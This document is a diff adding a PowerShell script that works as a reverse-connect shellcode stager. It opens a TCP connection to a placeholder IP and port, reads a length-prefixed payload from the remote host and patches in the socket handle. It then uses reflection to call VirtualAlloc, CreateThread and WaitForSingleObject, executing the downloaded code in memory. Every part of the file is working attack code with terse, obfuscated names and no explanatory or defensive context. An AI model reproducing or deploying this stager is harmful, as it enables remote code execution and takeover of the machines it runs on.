@@ -1,0 +1,98 @@
+$IP = 'XXXXXXXX'
+$Po = YYYYYYYY
+function Local:F1
+{
+Param(
+[OutputType([IntPtr])]
+[Parameter(Position = 0,Mandatory = $True)]
+[String] $Mo,
+[Parameter(Position = 1,Mandatory = $True)]
+[String] $Pr
+)
+$A = [AppDomain]::CurrentDomain.GetAssemblies() |
+Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+$B = $A.GetType('Microsoft.Win32.UnsafeNativeMethods')
+$C = $B.GetMethod('GetModuleHandle')
+$D = $B.GetMethod('GetProcAddress',[Type[]] @([System.Runtime.InteropServices.HandleRef],[String]))
+$E = $C.Invoke($null,@($Mo))
+$f = New-Object IntPtr
+$G = New-Object System.Runtime.InteropServices.HandleRef($f,$E)
+Write-Output $D.Invoke($null,@([System.Runtime.InteropServices.HandleRef] $G,$Pr))
+}
+function Local:F2
+{
+Param(
+[OutputType([Type])]
+[Parameter(Position = 0)]
+[Type[]] $Pa = (New-Object Type[](0)),
+[Parameter(Position = 1)]
+[Type] $Re = [Void]
+)
+$H = [AppDomain]::CurrentDomain
+$I = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+$J = $H.DefineDynamicAssembly($I,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$K = $J.DefineDynamicModule('InMemoryModule',$false)
+$L = $K.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+$M = $L.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,$Pa)
+$M.SetImplementationFlags('Runtime, Managed')
+$N = $L.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',$Re,$Pa)
+$N.SetImplementationFlags('Runtime, Managed')
+Write-Output $L.CreateType()
+}
+function Local:F3
+{
+$o = New-Object System.Byte[] 4
+$p = $ae.Read($o,0,4)
+$q = [BitConverter]::ToInt32($o,0)
+$o = [BitConverter]::GetBytes($ad.Client.Handle.ToInt32())
+$r = New-Object System.Byte[] ($q + 5)
+$r[0] = 0xBF
+$r[1] = $o[0]
+$r[2] = $o[1]
+$r[3] = $o[2]
+$r[4] = $o[3]
+$p = $ae.Read($r,5,$q)
+while ($p -lt $q) {
+$p += $ae.Read($r,($p + 5),($q - $p))
+}
+}
+function Local:F4
+{
+$S = F1 kernel32.dll VirtualAlloc
+$T = F2 @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])
+$U = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($S,$T)
+$v = $U.Invoke([IntPtr]::Zero,$r.Length + 1,0x3000,0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($r,0,$v,$r.Length)
+$X = F1 kernel32.dll CreateThread
+$Y = F2 @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr])
+$Z = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($X,$Y)
+$ht = $Z.Invoke([IntPtr]::Zero,0,$v,[IntPtr]::Zero,0,[IntPtr]::Zero)
+$Aa = F1 kernel32.dll WaitForSingleObject
+$Ab = F2 @([IntPtr],[Int32]) ([Int])
+$Ac = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Aa,$Ab)
+$Ac.Invoke($ht,0xFFFFFFFF) | Out-Null
+}
+function Local:F5
+{
+try {
+$ad = New-Object System.Net.Sockets.TcpClient($IP,$Po)
+$ae = $ad.GetStream()
+} catch {
+$af = $_.Exception.Message
+Write-Host $af
+exit
+}
+try {
+. F3
+. F4
+} catch {
+$af = $_.Exception.Message
+Write-Host $af
+exit
+} finally {
+$ae.Close()
+$ad.Close()
+$ae.Dispose()
+}
+}
+. F5
